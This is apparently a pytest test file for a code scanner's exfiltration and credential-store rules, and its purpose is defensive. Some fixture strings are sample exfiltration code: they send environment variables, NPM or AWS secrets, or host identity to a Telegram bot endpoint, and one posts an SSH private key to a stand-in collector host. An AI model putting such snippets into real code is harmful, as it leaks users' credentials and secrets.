"""What a request to a drop point carries: a setting the file configures itself with is not loot.

`CapabilityDetector._a_setting`. Hosts are the real drop points the rule exists for; the fixtures
send nothing anywhere -- they are scanned, never run.
"""

from __future__ import annotations

import pytest

from cordon_scanner import Scanner
from cordon_scanner.foundation.config.settings import Config

RULE = "SUSPECT.EXFIL.DROP_POINT.001"


class DropPointKit:
    @staticmethod
    def fires(tmp_path, source: str) -> bool:
        (tmp_path / "notify.py").write_text(source, encoding="utf-8")
        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
        return any(f.rule_id == RULE for f in result.findings)

    @staticmethod
    def notifier(reads: str) -> str:
        return (
            "import os, requests\n"
            f"value = {reads}\n"
            "def notify(text):\n"
            "    requests.post(\n"
            '        "https://api.telegram.org/bot%s/sendMessage" % os.getenv("TG_TOKEN"),\n'
            '        json={"chat_id": os.getenv("TG_CHAT"), "text": text, "v": str(value)},\n'
            "    )\n"
        )


class TestSettings:
    def test_a_notifier_reading_its_own_bot_token_is_quiet(self, tmp_path) -> None:
        assert not DropPointKit.fires(tmp_path, DropPointKit.notifier('os.getenv("TG_MODE")'))

    def test_the_architecture_is_not_who_the_machine_is(self, tmp_path) -> None:
        source = DropPointKit.notifier("platform.machine()").replace(
            "import os, requests", "import os, platform, requests"
        )
        assert not DropPointKit.fires(tmp_path, source)


class TestLoot:
    @pytest.mark.parametrize(
        "reads",
        [
            "dict(os.environ)",
            '__import__("getpass").getuser() + __import__("socket").gethostname()',
            'os.getenv("NPM_TOKEN")',
            'os.environ.get("AWS_SECRET_ACCESS_KEY")',
        ],
    )
    def test_identity_the_environment_or_another_services_credential_fires(
        self, tmp_path, reads
    ) -> None:
        assert DropPointKit.fires(tmp_path, DropPointKit.notifier(reads))


class StoreKit:
    @staticmethod
    def findings(tmp_path, source: str) -> set[str]:
        (tmp_path / "tool.py").write_text(source, encoding="utf-8")
        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
        return {f.rule_id for f in result.findings if "CREDENTIAL_STORE" in f.rule_id}


class TestAStoreReadByItsOwnClient:
    """`CapabilityDetector._store_used_by_its_own_client`."""

    SSH_DEPLOY = (
        "import os, paramiko\n"
        'key = os.path.expanduser("~/.ssh/id_ed25519")\n'
        "def deploy(host):\n"
        "    ssh = paramiko.SSHClient()\n"
        "    ssh.connect(host, key_filename=key)\n"
    )

    def test_an_ssh_key_loaded_into_an_ssh_client_is_authentication(self, tmp_path) -> None:
        assert not StoreKit.findings(tmp_path, self.SSH_DEPLOY)

    def test_the_same_key_posted_over_http_is_not(self, tmp_path) -> None:
        source = self.SSH_DEPLOY + (
            "import requests\n"
            "def share():\n"
            '    requests.post("https://collector.example.invalid/k", data=open(key).read())\n'
        )
        assert StoreKit.findings(tmp_path, source)
